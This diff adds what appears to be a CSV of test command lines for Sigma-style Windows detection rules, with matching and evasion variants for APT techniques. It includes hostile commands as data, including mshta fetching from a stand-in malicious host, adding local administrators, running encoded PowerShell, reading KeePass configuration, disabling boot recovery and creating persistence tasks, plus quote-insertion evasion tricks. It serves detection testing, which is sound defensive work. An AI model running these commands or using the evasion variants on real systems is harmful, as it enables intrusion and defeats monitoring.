@@ -1,0 +1,960 @@
+folder,file,command_line
+sysmon_apt_muddywater_dnstunnel,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" Start-Process rundll32.exe C:\ProgramData\Data``Exchange.dll,Start"
+sysmon_apt_muddywater_dnstunnel,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" Start-Process rundll32.exe C:\ProgramData\Data""""Exchange.dll,Start"
+sysmon_apt_muddywater_dnstunnel,Microsoft-Windows-Sysmon_1_Match_01.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" Start-Process rundll32.exe C:\ProgramData\DataExchange.dll,Start"
+sysmon_apt_muddywater_dnstunnel,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" Start-Process rundll32.exe C:\ProgramData\DataExchange.dll, Start"
+sysmon_apt_muddywater_dnstunnel,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" Start-Process rundll32.exe C:\ProgramData\DataExchange,Start"
+sysmon_apt_muddywater_dnstunnel,Microsoft-Windows-Sysmon_1_Match_02.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" Start-Process rundll32.exe C:\ProgramData\DataExchange.dll Start"
+win_apt_apt29_thinktanks,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NonInteractive -ep bypass $encodedCommand"
+win_apt_apt29_thinktanks,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noni -ExecutionPolicy bypass $encodedCommand"
+win_apt_apt29_thinktanks,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NonInteractive -ExecutionPolicy ""bypass"" $encodedCommand"
+win_apt_apt29_thinktanks,Microsoft-Windows-Sysmon_1_Match_01.json,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noni -ep bypass $encodedCommand
+win_apt_apt29_thinktanks,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NONI -EP bypass $encodedCommand
+win_apt_apt29_thinktanks,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NonInteractive -ExecutionPolicy bypass $encodedCommand"
+win_apt_apt29_thinktanks,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noni -ep BYPASS $encodedCommand
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,cmd.exe /c taskkill.exe /im cmd.exe
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,cmd.exe /c taskkill.exe -im cmd.exe
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,powershell mshta http://malicioussite.com
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,cmd /c taskkill -im cmd.exe
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_10.json,"reg ""query"" ""HKEY_CURRENT_USER}\Software\Microsoft\Terminal Server Client\Default"""
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Match_01.json,cmd.exe /c taskkill /im cmd.exe
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Match_03.json,"reg query ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"""
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,cmd /c taskkill /im cmd.exe
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,powershell mshta.exe http://malicioussite.com
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,powershell.exe mshta http://malicioussite.com
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,cmd /c taskkill.exe -im cmd.exe
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Match_02.json,powershell.exe mshta.exe http://malicioussite.com
+win_apt_babyshark,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_09.json,"reg.exe query ""HKEY_CURRENT_USER}\Software\Microsoft\Terminal Server Client\Default"""
+win_apt_bear_activity_gtr19,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Windows\System32\xcopy.exe /E /S /C /Q /H \client\""Default User""\  C:\Users\""Default User""\"
+win_apt_bear_activity_gtr19,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Program Files\AdExplorer\adexplorer.exe /snapshot """" c:\users\sigma\test.snp"
+win_apt_bear_activity_gtr19,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"C:\Windows\System32\xcopy.exe \client\""Default User""\  C:\Users\""Default User""\ /E /S /C /Q /H"
+win_apt_bear_activity_gtr19,Microsoft-Windows-Sysmon_1_Match_01.json,"C:\Program Files\AdExplorer\adexplorer.exe -snapshot """" c:\users\sigma\test.snp"
+win_apt_bear_activity_gtr19,Microsoft-Windows-Sysmon_1_Match_03.json,"C:\Program Files\AdExplorer\adexplorer.exe -snapshot """" c:\users\sigma\test.snp"
+win_apt_bear_activity_gtr19,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"C:\Windows\System32\xcopy.exe /S/E/C/Q/H \client\""Default User""\  C:\Users\""Default User""\"
+win_apt_bear_activity_gtr19,Microsoft-Windows-Sysmon_1_Match_02.json,"""C:\Windows\System32\xcopy.exe /S /E /C /Q /H \client\""Default User""\  C:\Users\""Default User""\"
+win_apt_elise,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Windows\System32\cmd.exe"" /c del C:\Users\$User\AppData\Roaming\MICROS~1\Windows\Caches\Nav""""ShExt.dll > nul"
+win_apt_elise,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\cmd.exe"" /c del ""C:\Users\$User\AppData\Roaming\MICROS~1\Windows\Caches\NavShExt.dll"" > nul"
+win_apt_elise,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"""C:\Windows\system32\rundll32.exe"" C:\Users\admin\AppData\Roaming\MICROS\~1\Windows\Caches\Nav""""ShExt.dll,Setting"
+win_apt_elise,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"""C:\Windows\system32\rundll32.exe"" C:\Users\admin\AppData\Roaming\MICROS\~1\Windows\Caches\NavShExt.dll Setting"
+win_apt_elise,Microsoft-Windows-Sysmon_1_Match_01.json,"""C:\Windows\system32\cmd.exe"" /c del C:\Users\$User\AppData\Roaming\MICROS~1\Windows\Caches\NavShExt.dll > nul"
+win_apt_elise,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\Windows\system32\cmd.exe"" /c del C:\Users\$User\AppData\Roaming\MICROS~1\Windows\Caches\NavShExt.dll  "
+win_apt_elise,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Windows\System32\cmd.exe"" /c del C:\Users\$User\AppData\Roaming\MICROS~1\Windows\Caches\NavShExt.dll>nul"
+win_apt_elise,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"""C:\Windows\system32\rundll32.exe"" C:\Users\admin\AppData\Roaming\MICROS\~1\Windows\Caches\NavShExt.dll, Setting"
+win_apt_elise,Microsoft-Windows-Sysmon_1_Match_02.json,"""C:\Windows\system32\rundll32.exe"" C:\Users\admin\AppData\Roaming\MICROS\~1\Windows\Caches\NavShExt.dll,Setting"
+win_apt_equationgroup_dll_u_load,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Windows\System32\rundll32.exe"" C:\Users\DefaultUser\AppData\SomeLib.dll dll_u"
+win_apt_equationgroup_dll_u_load,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\rundll32.exe"" C:\Users\DefaultUser\AppData\SomeLib.dll,  dll_u"
+win_apt_equationgroup_dll_u_load,Microsoft-Windows-Sysmon_1_Match_01.json,"""C:\Windows\system32\rundll32.exe"" C:\Users\DefaultUser\AppData\SomeLib.dll,dll_u"
+win_apt_equationgroup_dll_u_load,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Windows\System32\rundll32.exe"" C:\Users\DefaultUser\AppData\SomeLib.dll, dll_u"
+win_apt_hurricane_panda,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"Win64.exe ""net localgroup administrators admin /add"""
+win_apt_hurricane_panda,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"net ""localgroup"" ""administrators"" ""admin"" ""/add"""
+win_apt_hurricane_panda,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"net loca""""lgroup ""administrators"" ""admin"" /add"
+win_apt_hurricane_panda,Microsoft-Windows-Sysmon_1_Match_01.json,net localgroup administrators admin /add
+win_apt_hurricane_panda,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"net loca""""lgroup  administrators admin /add"
+win_apt_hurricane_panda,Microsoft-Windows-Sysmon_1_Match_02.json,"""C:\ProgramData\Win64.exe"" ""net localgroup administrators admin /add"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\'Internet Explorer'\Main\DisableFirstRunCustomize -PropertyType DWORD -name 'DisableFirstRunCustomize' -value 2 -Force"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\'Internet Explorer'\Main\DisableFirstRunCustomize -name 'DisableFirstRunCustomize' -PropertyType DWORD -value 2 -Force"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\'Internet Explorer'\Main\  -name 'Check_Associations' -Type String -value"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\'Internet Explorer'\Main\ -Type String -name 'Check_Associations' -value"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Match_01.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\'Internet Explorer'\Main\ -Property DWORD -name DisableFirstRunCustomize -value 2 -Force"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\Windows\CurrentVersion\'Internet Settings'\ZoneMap -Property DWORD -name IEHarden -value 0 -Force"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\'Internet Explorer'\Main\DisableFirstRunCustomize -Type DWORD -name 'DisableFirstRunCustomize' -value 2 -Force"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\Windows\CurrentVersion\'Internet Settings'\ZoneMap -PropertyType DWORD -name 'IEHarden' -value 0 -Force"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\Windows\CurrentVersion\'Internet Settings'\ZoneMap -Type DWORD -name 'IEHarden' -value 0 -Force"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\'Internet Explorer'\Main\ -PropertyType String -name 'Check_Associations' -value"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Match_02.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\'Internet Explorer'\Main\ -Property String -name Check_Associations -value"""
+win_apt_ke3chang_regadd,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_09.json,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""New-ItemProperty -Path hkcu:\Software\Microsoft\Windows\CurrentVersion\'Internet Settings'\ZoneMap -name 'IEHarden' -Property DWORD -value 0 -Force"""
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Windows\system32\rundll32.exe"" ""C:\Users\user\AppData\myLib.dll"",MyStart"
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\rundll32.exe"" ""C:\Users\user\AppData\myLib"",MyStart"
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"rundll32 ""C:\Users\user\AppData\myLib.dll"",MyStart"
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"rundll32 ""C:\Users\user\AppData\myLib.dll"", MyStart"
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Match_01.json,"""C:\Windows\System32\rundll32.exe"" C:\Users\user\AppData\myLib.dll, MyStart"
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Match_03.json,rundll32 C:\Users\user\AppData\myLib.dll MyStart
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"rundll32 C:\Users\user\AppData\myLib.dll, MyStart"
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"rundll32 ""C:\Users\user\AppData\myLib"" MyStart"
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"rundll32 ""C:\Users\user\AppData\myLib"", MyStart"
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"rundll32 ""C:\Users\user\AppData\myLib.dll"" MyStart"
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Match_02.json,"rundll32 C:\Users\user\AppData\myLib.dll,MyStart"
+win_apt_taidoor,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_09.json,"rundll32 ""C:\Users\user\AppData\myLib"",MyStart "
+win_apt_turla_comrat_may20,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"net.exe u""s""e ""https://docs.live.net/E654321"" kAmIkAzE! /u:somebloke@aol.co.uk"
+win_apt_turla_comrat_may20,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"net u""s""e ""https://docs.live.net/E654321"" kAmIkAzE! /u:""somebloke@aol.co.uk"""
+win_apt_turla_comrat_may20,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,tracert.exe -h 10 yahoo.com
+win_apt_turla_comrat_may20,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,tracert /h 10 yahoo.com
+win_apt_turla_comrat_may20,Microsoft-Windows-Sysmon_1_Match_01.json,tracert -h 10 yahoo.com
+win_apt_turla_comrat_may20,Microsoft-Windows-Sysmon_1_Match_03.json,"cmd.exe /c ""%SystemRoot%\System32\wsqmcons.exe &; powershell.exe -v 2 ""$QAY076ai = ‘AKWC;HUA389933tomasoas’;[Text.Encoding]::ASCII.GetString([Convert]::\""Fr`omBa`se6`4Str`ing\""((gp HKLM:\SOFTWARE\Microsoft\SQMClient\Windows).WSqmCons))|iex;"""""
+win_apt_turla_comrat_may20,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"net u""s""e https://docs.live.net/E654321 kAmIkAzE! /u:somebloke@aol.co.uk"
+win_apt_turla_comrat_may20,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"tracert -h 10 ""yahoo.com"""
+win_apt_turla_comrat_may20,Microsoft-Windows-Sysmon_1_Match_02.json,net use https://docs.live.net/E654321 kAmIkAzE! /u:somebloke@aol.co.uk
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,7z.exe a  -mx9 -r0 -v500m -pSomePassword .\archive1.zip .\file2.log
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,7z.exe a  -mx9 -r0 -pSomePassword .\archive1.zip .\file2.log
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"rundll32.exe ""C:\Windows\folder2\teardrop.dll"",Tk_fakeexport"
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"rundll32.exe C:\Windows\folder2\teardrop.dll,Tk_fakeexport"
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Match_01.json,7z.exe a -v500m -mx9 -r0 -pSomePassword .\archive1.zip .\file2.log
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Match_03.json,"cmd.exe /C ""echo Hello World!"""
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,7z.exe a  -mx9 -v500m -r0 -pSomePassword .\archive1.zip .\file2.log
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"cmd.exe /r ""echo Hello World!"""
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Match_04.json,rundll32 C:\Windows\\Folder\SomeLib.dll SomeFunction
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,rundll32 C:\Windows\folder2\teardrop.dll Tk_fakeexport
+win_apt_unc2452_cmds,Microsoft-Windows-Sysmon_1_Match_02.json,"rundll32.exe C:\Windows\folder2\teardrop.dll,Tk_fakeexport"
+win_apt_unc2452_ps,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell -c ""Invoke-WMIMethod -name create -Path win32_process -argumentlist 'rundll32 c:\windows\system32\shell32.dll Control_RunDLL'"""
+win_apt_unc2452_ps,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell -c ""Invoke-WMIMethod -name 'create' -Path 'win32_process' -argumentlist 'rundll32 c:\windows\system32\shell32.dll Control_RunDLL'"""
+win_apt_unc2452_ps,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"wmic /node:"""" process  call  create  ""rundll32.exe c:\windows\system32\shell32.dll, Control_RunDLL"""
+win_apt_unc2452_ps,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"wmic -node:"""" process  call  create  ""rundll32 c:\windows\system32\shell32.dll, Control_RunDLL"""
+win_apt_unc2452_ps,Microsoft-Windows-Sysmon_1_Match_01.json,"powershell -c ""Invoke-WMIMethod win32_process -name create -argumentlist 'rundll32 c:\windows\system32\shell32.dll Control_RunDLL'"""
+win_apt_unc2452_ps,Microsoft-Windows-Sysmon_1_Match_03.json,"powershell -c ""Invoke-WMIMethod win32_process -Name create -ArgumentList 'rundll32 c:\windows\system32\shell32.dll Control_RunDLL'"""
+win_apt_unc2452_ps,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell -c ""Invoke-WMIMethod -Path win32_process -name create -argumentlist 'rundll32 c:\windows\system32\shell32.dll Control_RunDLL'"""
+win_apt_unc2452_ps,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"wmic.exe /node:"""" process  call  create  ""rundll32 c:\windows\system32\shell32.dll, Control_RunDLL"""
+win_apt_unc2452_ps,Microsoft-Windows-Sysmon_1_Match_02.json,"wmic /node:sigma process call create ""rundll32 c:\windows\system32\shell32.dll, Control_RunDLL"""
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"cmd.exe /c schtasks /create /u """" /p ""P4SsW0RD!"" /ru system /sc daily /tr ""cmd /c powershell.exe -ExecutionPolicy bypass -file c:\s.ps1"" /tn ""win32times"" /f"
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"netsh advfirewall firewall add rule name=""powershell"" action=allow dir=in  localport=47000 | out-null"
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"cmd.exe /c sc \\localhost create  win32times  binpath=""cmd /c start c:\windows\temp\x.bat"""
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_11.json,"cmd.exe /Q /c type c:\users\user\appdata\Roaming\kee""""pass\KeePass.config.xml"
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,netsh advfirewall firewall add rule name=powershell action=allow protocol=tcp dir=in  localport=47000 | out-null
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_10.json,powershell -executionPolicy bypass -encodedCommand JgAg > rs.txt
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Match_01.json,"cmd.exe /c schtasks /create /u """" /p ""P4SsW0RD!"" /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\s.ps1"" /tn win32times /f"
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Match_03.json,"cmd.exe /c sc \\127.0.0.1 create win32times binPath=""cmd /c start c:\windows\temp\x.bat"""
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"cmd.exe /c schtasks /create /u """" /p ""P4SsW0RD!"" /ru system /sc daily /tn win32times /tr ""cmd.exe /c powershell.exe -ep bypass -file c:\s.ps1"" /f"
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"cmd.exe /c copy \\localhost\c$\windows\sys""""tem32\devmgr.dll \\localhost\c$\windows\temp\LMAKSW.ps1 /y"
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Match_04.json,cmd.exe /c copy \\localhost\c$\windows\system32\devmgr.dll \\localhost\c$\windows\temp\LMAKSW.ps1 /y
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,powershell -ep bypass -enc JgAg > rs.txt
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Match_06.json,cmd.exe /Q /c type c:\users\user\appdata\Roaming\keepass\KeePass.config.xml
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"cmd.exe /c sc \\localhost create ""win32times"" binPath=""cmd /c start c:\windows\temp\x.bat"""
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Match_07.json,cmd.exe /c reg query HKEY_CURRENT_USER\Software\user\PuTTY\Sessions\
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Match_02.json,netsh advfirewall firewall add rule name=powershell dir=in localport=47000 action=allow | out-null
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_09.json,"powershell.exe -exec ""bypass"" -enc JgAg > rs.txt"
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_12.json,"cmd.exe /c reg query ""HKEY_CURRENT_USER\Software\user\PuTTY\Sessions\"""
+win_apt_wocao,Microsoft-Windows-Sysmon_1_Match_05.json,powershell -exec bypass -enc JgAg > rs.txt
+win_apt_zxshell,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"rundll32.exe C:\d7z6t5g6j98j.dll, zxFunction"
+win_apt_zxshell,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,rundll32.exe C:\d7z6t5g6j98j.dll RemoteDiskXXXXX
+win_apt_zxshell,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"rundll32 C:\d7z6t5g6j98j.dll,RemoteDiskXXXXX"
+win_apt_zxshell,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"rundll32.exe C:\d7z6t5g6j98j.dll, RemoteDiskXXXXX"
+win_apt_zxshell,Microsoft-Windows-Sysmon_1_Match_01.json,"rundll32.exe C:\d7z6t5g6j98j.dll,zxFunction"
+win_apt_zxshell,Microsoft-Windows-Sysmon_1_Match_03.json,"rundll32.exe C:\j8i9o6k4tz654r3.dll,zxFunctionStar"
+win_apt_zxshell,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,rundll32.exe C:\d7z6t5g6j98j.dll zxFunction
+win_apt_zxshell,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"rundll32 C:\d7z6t5g6j98j.dll,zxFunction"
+win_apt_zxshell,Microsoft-Windows-Sysmon_1_Match_02.json,"rundll32.exe C:\d7z6t5g6j98j.dll,RemoteDiskXXXXX"
+win_bootconf_mod,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"bcdedit.exe /set {default} boot""status""policy ignore""allfai""lures"
+win_bootconf_mod,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"bcdedit.exe /s""e""t {default} recoveryenabled no"
+win_bootconf_mod,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"bcdedit.exe /set {default} recove""ryen""abled no"
+win_bootconf_mod,Microsoft-Windows-Sysmon_1_Match_01.json,bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+win_bootconf_mod,Microsoft-Windows-Sysmon_1_Match_03.json, bcdedit.exe -set {default} bootstatuspolicy ignoreallfailures
+win_bootconf_mod,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"bcdedit.exe /s""e""t {default} bootstatuspolicy ignoreallfailures"
+win_bootconf_mod,Microsoft-Windows-Sysmon_1_Match_02.json,bcdedit.exe /set {default} recoveryenabled 'no'
+win_change_default_file_association,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"c""m""d /c assoc .txt=txtfile"
+win_change_default_file_association,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"c""m""d.exe /""c"" assoc .bak= "
+win_change_default_file_association,Microsoft-Windows-Sysmon_1_Match_01.json,cmd /c assoc .log=txtfile
+win_change_default_file_association,Microsoft-Windows-Sysmon_1_Match_03.json,cmd /c assoc .bak= 
+win_change_default_file_association,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"cmd /""c"" assoc .txt=txtfile"
+win_change_default_file_association,Microsoft-Windows-Sysmon_1_Match_02.json,cmd.exe /c assoc .txt = txtfile
+win_cmdkey_recon,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"cmdkey /l""is""t:localhost"
+win_cmdkey_recon,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"cmdkey.exe /""list"""
+win_cmdkey_recon,Microsoft-Windows-Sysmon_1_Match_01.json,cmdkey /list Server01
+win_cmdkey_recon,Microsoft-Windows-Sysmon_1_Match_03.json,cmdkey.exe /list SomeOtherServer01
+win_cmdkey_recon,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"cmdkey.exe -""list"" localhost"
+win_cmdkey_recon,Microsoft-Windows-Sysmon_1_Match_02.json,cmdkey.exe /list localhost
+win_commandline_path_traversal,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,ping 127.0.0.1\..\..\..\Windows/System32/calc.exe
+win_commandline_path_traversal,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,ping 127.0.0.1/../System32/calc.exe
+win_commandline_path_traversal,Microsoft-Windows-Sysmon_1_Match_01.json,ping 127.0.0.1/../../System32/calc.exe
+win_commandline_path_traversal,Microsoft-Windows-Sysmon_1_Match_03.json,ping 127.0.0.1/../../../../calc.exe
+win_commandline_path_traversal,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,ping 127.0.0.1/../../System32/calc.exe
+win_commandline_path_traversal,Microsoft-Windows-Sysmon_1_Match_02.json,ping 127.0.0.1/../../../Windows/System32/calc.exe
+win_control_panel_item,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"reg ""ad""d ""HKCU\Software\Microsoft\Windows\CurrentVersion\""Control Panel""\CPLs"" /v spotless /d ""C:\some\other\malicious\lib.cpl"""
+win_control_panel_item,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"r""e""g add ""HKCU\Software\Microsoft\Windows\CurrentVersion\""Control Panel""\CPLs"" /v spotless /d ""C:\some\other\malicious\lib.cpl"" /f"
+win_control_panel_item,Microsoft-Windows-Sysmon_1_Match_01.json,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs"" /v spotless /d C:\labs\cplAddin\cplAddin\x64\Release\cplAddin2.cpl"
+win_control_panel_item,Microsoft-Windows-Sysmon_1_Match_03.json,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs"" /v spotless /d C:\Users\test\AppData\Roaming\evil.cpl"
+win_control_panel_item,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\""Control Panel""\CPLs"" /v spotless /d ""C:\labs\cplAddin\cplAddin\x64\Release\cplAddin2.cpl"""
